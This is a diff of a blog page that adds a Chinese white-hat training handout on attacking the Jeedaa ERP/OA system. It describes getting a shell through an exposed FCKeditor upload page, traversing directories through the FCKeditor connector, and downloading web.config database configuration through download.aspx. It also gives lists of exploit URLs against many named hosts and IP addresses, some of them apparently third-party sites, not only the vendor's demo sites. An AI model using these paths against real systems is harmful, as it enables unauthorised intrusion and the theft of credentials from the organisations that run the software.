@@ -178,7 +178,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 12, 2019&nbsp;&nbsp;17:03:19</a>
+                        Date: <a href="#">December 4, 2019&nbsp;&nbsp;19:00:32</a>
                         </span>
                     
                     
@@ -187,8 +187,76 @@
         </header>
 
         <div class="post-content">
-            <hr>
-<h2 id="title-Misc2-编码与密码"><a href="#title-Misc2-编码与密码" class="headerlink" title="title:Misc2.编码与密码"></a>title:Misc2.编码与密码</h2><pre><code>https://bbs.zkaq.cn/t/4132.html</code></pre><p>本人在某安全社区写的文章</p>
+            <h1 id="米斯特白帽培训讲义-实战篇-捷达系统"><a href="#米斯特白帽培训讲义-实战篇-捷达系统" class="headerlink" title="米斯特白帽培训讲义 实战篇 捷达系统"></a>米斯特白帽培训讲义 实战篇 捷达系统</h1><blockquote>
+<p>讲师：<a href="https://www.zhihu.com/people/gh0stkey/answers" target="_blank" rel="noopener">gh0stkey</a></p>
+</blockquote>
+<blockquote>
+<p>整理：<a href="https://github.com/" target="_blank" rel="noopener">飞龙</a></p>
+</blockquote>
+<blockquote>
+<p>协议：<a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></p>
+</blockquote>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>官网：<a href="http://www.jeedaa.com/" target="_blank" rel="noopener">http://www.jeedaa.com/</a></p>
+<p>主要产品有： </p>
+<ul>
+<li>捷达ERP</li>
+<li>捷达OA</li>
+<li>捷达eHR</li>
+<li>捷达CRM</li>
+<li>捷达eFax</li>
+<li>捷达仓库管理</li>
+<li>捷达进销存.Net</li>
+<li>捷达协同办公.Net</li>
+</ul>
+<p>均存在能够 GetShell 的漏洞。</p>
+<p>这个东西仍旧是闭源的，我们使用它的演示站点，<code>http://demoerp.jeedaa.com</code>来进行演示。</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>我们用御剑扫一扫。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-d8fcd807922e4128.jpg" alt></p>
+<p>出现了 FCKEditer。我们访问<code>/fckeditor</code>，发现是 403 的。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-5919fdb9bf38ea9f.jpg" alt></p>
+<p>但是我们扫描<code>/fckeditor/fckeditor</code>：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-c2310e91858835b6.jpg" alt></p>
+<p>发现有三个 200。我们访问<code>/fckeditor/fckeditor/editor/filemanager/upload/test.html</code>：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-9a9f51512969e688.jpg" alt></p>
+<p>我们在查看元素里面添加一个 ASPX，然后随便上传一个 ASP 文件上去。获得了该文件的链接。</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-c126182c7b98a75e.jpg" alt></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-ceaba8d857552e53.jpg" alt></p>
+<p>部分案例（均为捷达的演示站点）：</p>
+<ul>
+<li><code>http://erp2008v4.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://erp.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://qd.jeedaa.net//fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://oa.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://demoerp.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://crm.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://shijia.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://lg.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+<li><code>http://hj.jeedaa.com/fckeditor/FCKeditor/editor/filemanager/upload/test.html</code></li>
+</ul>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>访问<code>/fckeditor/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=E:/&amp;CurrentFolder=%2F</code></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-eb7ab441926ff035.jpg" alt></p>
+<p>可以改动<code>CurrentFolder</code>参数来进入子目录，也可以改动<code>Type</code>参数来切换盘符。</p>
+<h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><p>访问<code>/WebApp/PassportService/download.aspx?p=/AccreditAdmin/Web.config</code>下载数据库文件：</p>
+<p><img src="http://upload-images.jianshu.io/upload_images/118142-d9e4cd2e61c475cf.png" alt></p>
+<p>部分案例：</p>
+<ul>
+<li><code>http://221.136.81.169/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://61.164.170.82:88/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://www.nbjyly.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://oa.jobgroup.cn:2013/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://erp2008v4.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://erp.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://qd.jeedaa.net//WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://61.130.104.162:8080/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://oa.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://demoerp.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://crm.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://shijia.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://lg.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://hj.jeedaa.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://oa.nbself.com/WebApp/PassportService/download.aspx?p=web.config</code></li>
+<li><code>http://61.164.170.82:88/WebApp/PassportService/download.aspx?p=web.config</code></li>
+</ul>
 
         </div>
 
@@ -203,7 +271,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="http://yoursite.com/2019/11/12/Misc2.编码与密码/">http://yoursite.com/2019/11/12/Misc2.编码与密码/</a></span>
+                        <span><a href="http://yoursite.com/2019/12/04/实战篇 捷达系统/">http://yoursite.com/2019/12/04/实战篇 捷达系统/</a></span>
                     </p>
                 
                 
@@ -236,10 +304,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2019/12/04/工具篇 AWVS/"></a>
+                <a class="prev" rel="prev" href="/2019/12/04/实战篇 南方 0day/"></a>
             
             
-            <a class="next" rel="next" href="/2019/11/12/2019网络空间竞赛Misc1.编码/">2019网络空间竞赛Misc1.编码</a>
+            <a class="next" rel="next" href="/2019/12/04/实战篇 迅雷 CMS/"></a>
             
         </section>
 
